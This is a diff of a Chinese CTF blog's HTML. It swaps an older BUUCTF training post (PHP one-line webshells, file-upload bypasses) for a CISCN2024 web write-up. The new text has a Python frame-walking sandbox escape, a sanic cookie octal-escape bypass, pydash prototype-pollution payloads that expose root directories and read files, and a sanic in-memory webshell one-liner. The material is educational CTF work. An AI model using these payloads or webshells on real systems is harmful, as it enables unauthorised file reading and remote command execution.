+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code</span><br><span class="line">    bui = frame.f_back.f_back.f_back.f_globals[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">dir</span> = bui.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(code))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code.co_consts:</span><br><span class="line">        <span class="built_in">print</span>(i)	<span class="comment"># 一块一块输出的</span></span><br><span class="line">b=waff()</span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221644134.bmp"
-                      alt="capture_20231022160636188"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246751.png"
+                      alt="image-20240531173034344"
                 ></p>
-<p>但这一串不是flag，下一个表！</p>
-<p>​		<code>l0ve1ysq1 : id、username、password</code></p>
-<p>一条条试烦了</p>
+<p>绕过最后一步的过滤（将列表转换成字符串，把每一项化零为整）</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221704052.bmp"
-                      alt="capture_20231022170043769"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221704652.bmp"
-                      alt="capture_20231022164920461"
-                ></p>
-<p>居然在第16条。。</p>
-<p>得到flag~</p>
-<hr>
-<h3 id="BUUCTF-Knife1"><a href="#BUUCTF-Knife1" class="headerlink" title="BUUCTF Knife1"></a>BUUCTF Knife1</h3><p>给我们了<code>php</code>的一句话木马</p>
-<p>题目也提示“刀”  →  中国菜刀 or 蚁剑</p>
-<p>有关<strong>一句话木马</strong>：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232304277.bmp"
-                      alt="capture_20231023210646198"
-                ></p>
-<p><code>eval</code>会将后面的code作为php代码运行；我们通过菜刀或蚁剑或…将我们想要执行的代码（蚁剑的 详见下方链接）以POST形式传给参数<code>Syc</code>，之后就可以通过一句话木马将其执行。</p>
-<p>简单点就比如说：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232330771.png"
-                      alt="image-20231023233052841"
-                ></p>
-<p>当然php语句必须完整（没有分号的话）：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232332706.png"
-                      alt="image-20231023233210949"
-                ></p>
-<p>回到题目   运行蚁剑</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232324734.png"
-                      alt="image-20231023232437543"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246752.png"
+                      alt="image-20240531175505982"
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232325511.png"
-                      alt="image-20231023232522055"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246753.png"
+                      alt="image-20240531175721595"
                 ></p>
-<p>得到flag~</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/101227210?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163176081716780265456870%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163176081716780265456870&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-101227210.first_rank_v2_pc_rank_v29&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%ACphp&spm=1018.2226.3001.4187" >一句话木马 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.codenong.com/cs105596701/" >蚁剑工作原理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<hr>
-<h3 id="BUUCTF-Upload1"><a href="#BUUCTF-Upload1" class="headerlink" title="BUUCTF Upload1"></a>BUUCTF Upload1</h3><p>文件上传</p>
-<p>先简单地赤裸裸地传个一句话木马</p>
+<h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>python高性能异步框架</p>
+<h5 id="step1-cookie"><a href="#step1-cookie" class="headerlink" title="step1  cookie"></a>step1  cookie</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>cookies的user的值中含有 ； </p>
+<p>正常传值分号会导致字符串被截断，需要想办法绕过</p>
+<p>找<strong>cookie解析</strong>过程</p>
+<p>value的处理</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310272230159.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241114020.png"
-                      alt="image-20231024111437870"
-                ></p>
-<p>加上<strong>文件幻术头</strong>骗一骗</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310272230697.png"
-                      alt="image-20231027223031739"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246754.png"
+                      alt="image-20240531221219193"
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241121101.png"
-                      alt="image-20231024112120773"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246755.png"
+                      alt="image-20240531230101985"
                 ></p>
-<p>啊被拦了，看来是对文件内容进行了检测查到了<code>&#39;&lt;?&#39;</code>，那就换个一句话木马</p>
+<p>o_match、q_match两个匹配到了</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310272230903.png"
-                      alt="image-20231027223053051"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246756.png"
+                      alt="image-20240531225530530"
                 ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.append(chr(int(str[j + 1 : j + 4], 8)))</span><br></pre></td></tr></table></figure></div>
+
+<p>str[j + 1 : j + 4] 八进制转十进制、十进制转字符串，之后塞到cookie的value中（注意cookie格式）</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241141406.png"
-                      alt="image-20231024114117626"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246757.png"
+                      alt="image-20240531231114198"
                 ></p>
-<p>上传成功，重新抓包改改它</p>
+<h5 id="step2-pydash原型链污染"><a href="#step2-pydash原型链污染" class="headerlink" title="step2  pydash原型链污染"></a>step2  pydash原型链污染</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_(pollute, key, value)	//设置属性值</span><br></pre></td></tr></table></figure></div>
+
+<p>（注意key与value需要以json格式发送</p>
+<p>利用点——污染<code>__file__</code>属性</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure></div>
+
+<p>过滤</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ... and &#x27;_.&#x27; not in key:</span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241316857.bmp"
-                      alt="capture_20231024131459689"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246758.png"
+                      alt="image-20240601202319847"
                 ></p>
-<p>上传！</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.compile(r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;)</span><br><span class="line">如果是“.”，要求点前面 无\ 或 多次双\ </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;[flag路径]&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>要么环境变量查看 <code>/proc/1/environ</code></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241149594.bmp"
-                      alt="capture_20231024114819586"
-                ></p>
-<p>哦！绕过后缀的有文件格式有<code>php,php3,php4,php5,pht,phtml</code></p>
-<p>试试但前面的都逝了，例：</p>
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246760.png"
+                      alt="image-20240709190249299"
+                >要么找flag路径（注意更新sanic版本</p>
+<p>目光落到注册静态路由这句话上</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>进入static </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241154268.png"
-                      alt="image-20231024115401716"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246761.png"
+                      alt="image-20240709200616447"
                 ></p>
-<p>只有phtml上传成功</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">directory_view: Whether to fallback to showing the directory viewer when exposing a directory</span><br><span class="line"></span><br><span class="line">directory_handler: An instance of :<span class="keyword">class</span>:`DirectoryHandler`that can be used <span class="keyword">for</span> explicitly controlling <span class="keyword">and</span> subclassing the behavior of the default directory handler（DirectoryHandler的实例）</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>&#x3D;&#x3D;&gt; 污染DirectoryHandler类达到 列目录 且 列根目录 的功能</strong> </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241155284.png"
-                      alt="image-20231024115526563"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246762.png"
+                      alt="image-20240709210143949"
                 ></p>
-<p>文件路径（一般是<code>...upload/safe.phtml</code> 可以在网页上验证）→ 蚁剑</p>
-<p>注意！！一定先把burp关掉，否则一直error显示超时！！！（又给我搞懵了）</p>
+<p>之后就是怎么拿到这个DirectoryHandler类</p>
+<p>起点是 <strong>静态文件路由对象</strong> </p>
+<p>之后通过某种途径获得DirectoryHandler对象，然后污染类中的directory_view属性和directory属性，之后就能直接访问&#x2F;static&#x2F;查看目录了</p>
+<ol>
+<li>获得 静态文件路由对象</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index[&#x27;__mp_main__.static&#x27;]</span><br><span class="line">// 返回注册在应用中的静态文件路由对象</span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li>查看对象中可利用属性</li>
+</ol>
+<p>（随便找一个有该对象的地方下个断点）</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241318892.png"
-                      alt="image-20231024131835927"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246763.png"
+                      alt=" "
                 ></p>
-<p>之后找到flag文件就可以啦</p>
+<p>顺着就找到污染链了</p>
+<blockquote>
+<p>注意这里不能用[]来包裹其中的索引，污染和直接调用不同，污染时需要用 . 来连接，而<code>__mp_main__.static</code>是一个整体不能分开，因此<code>\\.</code>将其转义</p>
+</blockquote>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;:&quot;True&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>对于 <code>directory  </code>，输出为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WindowsPath(&#x27;F:/python_projects/sanic/static&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p>是一个对象，输出在parts中</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241320806.png"
-                      alt="image-20231024132017687"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246764.png"
+                      alt="image-20240710150800182"
                 ></p>
-<p>得到flag~</p>
+<p>但parts是一个tuple，pydash不能直接处理</p>
+<blockquote>
+<p>pydash可以处理对象obj、列表[]、字典{}，不能处理tuple、set等</p>
+</blockquote>
+<p>看一看parts是如何被赋值的（这里找的好像有点复杂，可以直接从DirectoryHandler类那里看directory是如何赋值的）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246765.png"
+                      alt="image-20240710152443608"
+                ></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directory = file_or_directory</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_or_directory = Path(file_or_directory).resolve()</span><br></pre></td></tr></table></figure></div>
+
+<p>是一个path对象，说明directory是一个path对象，再往下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246766.png"
+                      alt="image-20240710153507767"
+                ></p>
+<p>在_from_parts函数中，parts赋值给<code>_parts</code>属性</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246767.png"
+                      alt="image-20240710153830181"
+                ></p>
+<p>康康directory的_parts属性，输出一个列表</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;F:\\&#x27;, &#x27;python_projects&#x27;, &#x27;sanic&#x27;, &#x27;static&#x27;]</span><br></pre></td></tr></table></figure></div>
+
+<p>直接污染</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;:[&#x27;/&#x27;]&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>此时static可查看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246768.png"
+                      alt="image-20240710160927226"
+                ></p>
+<p>得到flag文件名，再次污染</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/24bcbd0192e591d6ded1_flag&quot;&#125;	// 注意“/”</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246769.png"
+                      alt="image-20240710162134799"
+                ></p>
+<h3 id="sanic的内存马"><a href="#sanic的内存马" class="headerlink" title="sanic的内存马"></a>sanic的内存马</h3><p>仿照flask框架</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_route(handler,&quot;/test&quot;,method=[&quot;GET&quot;,&quot;POST&quot;])</span><br></pre></td></tr></table></figure></div>
+
+<p>应用</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;app.add_route(lambda request:__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(&#x27;</span>cmd<span class="string">&#x27;)).read(),&#x27;</span>/shell<span class="string">&#x27;,method=[&#x27;</span>GET<span class="string">&#x27;,&#x27;</span>POST<span class="string">&#x27;])&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>waiting…</p>
 
         </div>
 
@@ -945,18 +943,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> training-2</li>
+        <li><strong>Title:</strong> CISCN2024初赛 web wp</li>
         <li><strong>Author:</strong> dawn_r1sing</li>
         <li><strong>Created at
-                :</strong> 2023-10-29 23:14:09</li>
+                :</strong> 2024-07-16 12:43:26</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2023-10-30 08:44:37
+                    :</strong> 2024-07-16 17:55:09
             </li>
         
         <li>
-            <strong>Link:</strong> https://dawnrisingdong.github.io/2023/10/29/training-2/
+            <strong>Link:</strong> https://dawnrisingdong.github.io/2024/07/16/CISCN2024初赛-web-wp/
         </li>
         <li>
             <strong>
@@ -985,10 +983,6 @@
                         <a href="/tags/web/">#web</a>&nbsp;
                     </li>
                 
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/%E9%9B%86%E8%AE%AD/">#集训</a>&nbsp;
-                    </li>
-                
             </ul>
         
 
@@ -997,29 +991,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2023/10/29/training-3/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">training-3</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2023/10/29/training-1/"
+                        href="/2024/06/07/BUUCTF2024/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">training-1</span>
+                                <span class="post-nav-title-item">BUUCTF2024</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -1082,8 +1061,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">training-2</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%91%A8%E5%92%8C%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%882%EF%BC%89"><span class="nav-text">第一周和第二周（2）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Refer%E6%B3%A8%E5%85%A5"><span class="nav-text">Refer注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-PHP2"><span class="nav-text">攻防世界 PHP2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Training-WWW-Robots"><span class="nav-text">攻防世界 Training-WWW-Robots</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cics-06"><span class="nav-text">攻防世界ics-06</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF-LoveSQL1"><span class="nav-text">BUUCTF LoveSQL1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF-Knife1"><span class="nav-text">BUUCTF Knife1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF-Upload1"><span class="nav-text">BUUCTF Upload1</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">CISCN2024初赛 web wp</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-php"><span class="nav-text">simple_php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easycms"><span class="nav-text">easycms</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mossfern"><span class="nav-text">mossfern</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sanic"><span class="nav-text">sanic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sanic%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">sanic的内存马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezjava"><span class="nav-text">ezjava</span></a></li></ol>
 
     </div>
 </div>
